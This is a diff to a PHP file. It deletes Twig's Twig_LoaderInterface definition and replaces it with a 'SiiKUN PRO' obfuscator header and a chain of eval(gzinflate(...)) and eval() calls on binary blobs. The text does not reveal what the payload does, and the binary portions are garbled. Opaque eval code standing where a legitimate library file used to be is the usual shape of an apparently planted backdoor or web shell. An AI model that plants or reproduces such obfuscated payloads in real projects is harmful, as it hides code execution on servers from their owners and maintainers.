@@ -1,53 +1,12 @@
 <?php
-
-/*
- * This file is part of Twig.
- *
- * (c) 2009 Fabien Potencier
- *
- * For the full copyright and license information, please view the LICENSE
- * file that was distributed with this source code.
- */
-
-/**
- * Interface all loaders must implement.
- *
- * @author Fabien Potencier <fabien@symfony.com>
- */
-interface Twig_LoaderInterface
-{
-    /**
-     * Gets the source code of a template, given its name.
-     *
-     * @param string $name The name of the template to load
-     *
-     * @return string The template source code
-     *
-     * @throws Twig_Error_Loader When $name is not found
-     */
-    public function getSource($name);
-
-    /**
-     * Gets the cache key to use for the cache for a given template name.
-     *
-     * @param string $name The name of the template to load
-     *
-     * @return string The cache key
-     *
-     * @throws Twig_Error_Loader When $name is not found
-     */
-    public function getCacheKey($name);
-
-    /**
-     * Returns true if the template is still fresh.
-     *
-     * @param string $name The template name
-     * @param int    $time Timestamp of the last modification time of the
-     *                     cached template
-     *
-     * @return bool true if the template is fresh, false otherwise
-     *
-     * @throws Twig_Error_Loader When $name is not found
-     */
-    public function isFresh($name, $time);
-}
+ /*
+|#| Message      : Jangan ubah kode ini, atau skrip Anda tidak akan berfungsi.
+|#| Product      : SiiKUN PRO PHP Encoder & Obfuscator
+|#| Author       : SiiKUN TM
+|#| URL          : https://github.com/karyakode/siikunpro
+*/
+eval(gzinflate("­–iOQ†ÿÊ-ÁÈtln_ÿˆZc
+‰Á°15&.uÃl´˜ªÅŠ{µãRÁXqˆh5Ô*\"nˆZ\\j°.Aıv.I?N{î{ŞsÎˆ…œ'Â,Iš\\œ)Id‹er'|Xå,íS]…ßÃ	\"çáoôøšÃn,ÒÛ”•“¿lù­§àl·j­¸}Ú§Ğ®ÌÖ]ŸE ¶{Û8j_ÿÑp9£œ\\;ºÜS÷9z\\Å…cå^Ã­É®B|ÄJÊLâÅğ’x±Qô3&ø;;6~F'ñ¢é÷1\\Í*¥Fİš5ƒ¢şfù´`[³0³0ÒÙö¥gÌ?ìÓM¸Zh—@9H,D0˜	/@_¦Ê±Ñ)é‚´ÌtG&—J¯á›DÊEli±³hĞş¶±iU×ÖªÈ®ômU•ïx¦7ÊfJ)Í§‰	1±7‹N¿â¼ÎömÛ©wÕ5µî/ëŞšîªÅºÄà²^ÒD¬Ò€É=C1Ì©\"áŸÊ kƒ!^vLzëÎ«ÂÕ¶ß…—îÂ£V(5®ÉfïãëôQŞÜÂ?Cfdp›¾WİBYjG§¬?küE[ã§ŠÚ	×ªÁ<¿é¶¶1¹¹¯gíå5yf»s®Àíè»Qn˜®®Û7ÏzO†?îZ-Œ©Y4ËszÛÜv²^m™?ÿ³Tİ?i|§5›n¾¹+Ë²ãÅ!a&­Ü^YƒÊ¬-9Ş0œ¿§ò´UZoïâÅx¬5éwo%|¶ºµ{«‚jªhñYÏo›*Ê2g³¹oÚúùdª9à\\ásã@J<¨Ì É`ë€:=ç£4‘”“)M‡…OOM&ĞdAM*E’ÉŒs‚cŠE|>Ÿ6sc8q™®ÏÅ2‘(U&â°d¢T+Œ'şŸKØş¼!ûáEÕ:Ô¡²ÚK?9–”¶õs]¥­·Mğ|µ'¶À^º÷Ñ]ñ¡Š‘ ÑñŒ„oKHø{\\e»ñ‰pQà@ƒŞ	‹øIa¡ =C@Azb¢0õÄ°‰1—H8o:†GÁì1Ògü‹†\"CÂ×*àSŒbğÀ€“b²Š\"ñù@’¡,1põ‡´ä‚ç‚®z\\pèÃò”
+äYR	zõF,f¤ÊpE0ßÚ¹"));eval(ºÕùÑé¯ªƒÒ("ˆálÃ-Õi?ß¡„}´!A(O”æÄ[ì¨—0ag))ØhF{ÕéKÃ”®µãösâÊÖz”ŸºW*’Íâe÷{CÛœÊ}Õ~ê¿¹
+GF‚•ÔoZ-^#
+ÖX}¡Ã™K›€ƒÈJpŸX:˜x	µƒUŞøª‰åÖÒv„ò»şysæ~4¦	†ùé¸Æ%ni6Œ¦šÖPÈ¸c8“ÖŸ¨©Ã©]Ÿlı„%R?œçÃŞ?rİj,„ò ):j"));eval(˜áôâÈß¦®„—‹ÒĞ‚("‹‹ËÇ‡‰ôÍıÙøÒĞ¢»±”İôÒììç¥÷ºáÁëµ‰ı”îĞü¶¢ÖÊ…íúøÊ‚‰º«€‰ïŠ«âƒ¸È›”àüœªÿ„¿»¯ø°óŠİ¶ããÅ£—¬šÙŒ	LC¦\\1©ˆ¶AßqÅRŠÖ‘ñq¤O¬å½×`m-6…XöØkÔÂ«´äNá9˜ÏÕE„Dt\\uóBÌHèqkDk|ÿ7î£¹6¶¦Ø–oypb»Éô¸¼»šÿßİ‰ö÷ı€ì¬¼ÄÙéï«Ûş¨Á®±‡Üüò‹¼¨ªÛ…Êï¾¡¦"));?>
